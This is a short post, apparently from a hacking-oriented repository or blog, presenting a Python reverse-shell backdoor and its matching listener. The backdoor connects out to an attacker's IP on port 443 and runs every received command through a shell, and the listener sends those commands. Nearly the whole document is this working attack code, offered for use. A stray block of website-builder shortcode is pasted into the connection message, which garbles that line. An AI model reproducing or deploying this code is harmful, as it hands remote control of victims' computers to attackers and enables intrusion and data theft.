# Python-Backdoor
Backdoor Codes:
##Protocol HackeR 
##instagram:fakelinux
import socket,subprocess
HOST = 'Your IP'   
PORT = 443           
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))

s.send('[fusion_builder_container hundred_percent="yes" overflow="visible"][fusion_builder_row][fusion_builder_column type="1_1" background_position="left top" background_color="" border_size="" border_color="" border_style="solid" spacing="yes" background_image="" background_repeat="no-repeat" padding="" margin_top="0px" margin_bottom="0px" class="" id="" animation_type="" animation_speed="0.3" animation_direction="left" hide_on_mobile="no" center_content="no" min_height="none"][*] Connection Established!')

while 1:

     data = s.recv(1024)

     if data == "quit": break

     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

     stdout_value = proc.stdout.read() + proc.stderr.read()

     s.send(stdout_value)

s.close()
 
 Listen Codes:
 ##Protocol Hacker
from socket import *
HOST = 'Your IP'        
PORT = 443         
s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((HOST, PORT))
print "Listening on 0.0.0.0:%s" % str(PORT)
s.listen(10)
conn, addr = s.accept()
print 'Connected by', addr
data = conn.recv(1024)
while 1:
     command = raw_input("Enter shell command or quit: ")
     conn.send(command)
     if command == "quit": break
     data = conn.recv(1024)
     print data
conn.close()
